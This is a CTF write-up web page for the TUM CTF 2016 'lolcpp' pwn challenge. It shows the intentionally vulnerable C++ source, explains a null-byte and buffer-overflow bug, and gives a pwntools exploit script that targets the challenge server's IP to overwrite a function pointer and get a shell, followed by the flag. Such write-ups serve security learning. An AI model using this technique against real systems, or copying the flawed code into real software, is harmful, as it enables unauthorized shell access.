<!DOCTYPE html>
<html lang="en">

    <?php
      include('../includes/headers.php');
      include('../includes/navbar.php');
      include('../includes/footers.php');
      print getHeaders('TUM-2016');
    ?>

<body>


    <?php
      print getNavbar(1);
    ?>
    <!-- Page Header -->
    <!-- Set your background image for this header on the line below. -->
    <header class="intro-header" >
        <div class="container">
            <div class="row">
                <div class="col-lg-6 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <div class="post-heading">
                        <h1><img src="../img/tumctf.png" alt="tum" align="center"></h1>
                            
                        <span class="meta">Posted by <a href="#">kablaa</a> October, 2016</span>

                    </div>

                </div>
            </div>
        </div>
    </header>

    <!-- begn challenge list -->
    <div class="container">
        <div class = "row">
                <div class="post-body col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1">
                    <div claa = "list-group">
                        <a href="#lolcpp" class = "list-group-item">lolcpp <span class ="badge">pwn-250</span></a>
                    </div>
                </div>
        </div>
    </div>
    <!-- Post Content -->
    <article>
        <div class="container">
            <div class="row">
                <div class="post-body col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1">
                    <h1 id="lolcpp">lolcpp (pwn-250)</h1>
                        <p>
                        We were given the source code for this challenge. 
                        </p>
                    <pre>
                        <code class="language-cpp">

#include &lt;cstdint&gt;
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
#include &lt;cstring&gt;
#include &lt;functional&gt;
#include &lt;memory&gt;
#include &lt;unistd.h&gt;


constexpr size_t entry_len = 0x50;

void strip_newline(char *buf, size_t size) {
    char *p = &amp;size[buf];
    while (p &gt;= buf) {
        if (0 == *p or '\n' == *p) {
            *p = 0;
        }
        p--;
    }
}


class User {
public:
    User() {}
    User(const char *name, const char *passwd) {
        strncpy(this-&gt;name, name, sizeof(this-&gt;name));
        strncpy(this-&gt;password, passwd, sizeof(this-&gt;password));
    }

    bool check_name(const char *name) {
        return 0 == strcmp(this-&gt;name, name);
    }

    bool check_password(const char *passwd) {
        return 0 == strcmp(this-&gt;password, passwd);
    }

    void read_name() {
        char input[entry_len];
        fgets(input, sizeof(input) - 1, stdin);
        strip_newline(input, sizeof(input));
        memcpy(this-&gt;name, input, sizeof(this-&gt;name));
    }

    void read_password() {
        char input[entry_len];
        fgets(input, sizeof(input) - 1, stdin);
        strip_newline(input, sizeof(input));
        memcpy(this-&gt;password, input, sizeof(this-&gt;password));
    }

    virtual const char *get_password() {
        return this-&gt;password;
    }

    virtual void shell() {
        printf(&quot;no shell for you!\n&quot;);
    }

    bool operator ==(const User &amp;other) {
        return (this-&gt;check_name(other.name)
                and this-&gt;check_password(other.password));
    }

private:
    char name[entry_len];
    char password[entry_len];
};

class Noob : public User {
public:
    virtual void shell() {
        printf(&quot;ehehehe..!&quot;);
    }

    bool check_password(const char *) {
        printf(&quot;noobs need no passwords!\n&quot;);
        return false;
    }
};

class Admin : public User {
public:
    Admin(const char *name, const char *passwd)
        :
        User{name, passwd} {}

    virtual void shell() {
        printf(&quot;Hi admin!\n&quot;);
        system(&quot;/bin/sh&quot;);
    }
};

auto password_checker(void (*accepted)()) {
    constexpr ssize_t equals = 0;
    return [&amp;](const char *input, const char *password) {
        char buf[entry_len];
        if (equals == strcmp(input, password)) {
            snprintf(buf, sizeof(buf), &quot;password accepted: %s\n&quot;, buf);
            puts(buf);
            accepted();
        } else {
            printf(&quot;nope!\n&quot;);
        }
    };
}


User login;

int main() {
    setbuf(stdout, nullptr);

    char access_password[entry_len] = &quot;todo: ldap and kerberos support&quot;;

    Admin admin{&quot;admin&quot;, access_password};

    auto success = [] {
        printf(&quot;congrats!\n&quot;);
        login.shell();
    };

    printf(&quot;please enter your username: &quot;);
    login.read_name();

    printf(&quot;please enter your password: &quot;);
    auto check_pw = password_checker(success);
    login.read_password();

    check_pw(login.get_password(), admin.get_password());
}
                        </code>
                    </pre>
                    <p>
                        There are two main bugs in this program. First, we have the <code>strip_newline</code> and <code>fgets</code> functions. From the <code>fgets</code> man page:
                        <pre>
The fgets function reads at most one less than the number of characters
specified by n from the stream pointed to by stream into the array pointed
to by s. No additional characters are read after a new-line character
(which is retained) or after end-of-file. A null character is written
immediately after the last character read into the array.
Returns 
                        </pre>
                        So, if we add a <code>NULL</code> byte at the end of the password, <code>strcpy</code> will see the end of the string but <code>fgets</code> will not. Thus we will be able to pass the check and keep writing. The second vulnerability comes front the fact that the <code>User</code> object is declared without any arguments passed to its constructor.
                        In the <code>User::read_password</code> function, When 
                        <pre>
                            <code class="language-cpp">
memcpy(this->password, input, sizeof(this->password));
                            </code>
                        </pre>
is executed, we can overflow <code>user::password</code> and overwrite the <code>User::accepted</code> function. Here is my <code>exploit.py</code>

                    <pre>
                        <code class="language-python">
from pwn import *
host = '104.198.76.97'
port = 9001
p = remote(host,port)
win_func = 0x400E9A
password = "todo: ldap and kerberos support"
password += "\0"
password += cyclic(40)
password += p64(win_func)
p.sendline("USERNAME")
p.sendline(password)
p.interactive()

                        </code>
                    </pre>
                    <pre>
hxp{b357 l4ngu4g3 3v3r (7m)}
                    </pre>
                    </p>
                </div>
            </div>
        </div>
    </article>

    <hr>

<?php
      print getFooters();
?>

</body>

</html>
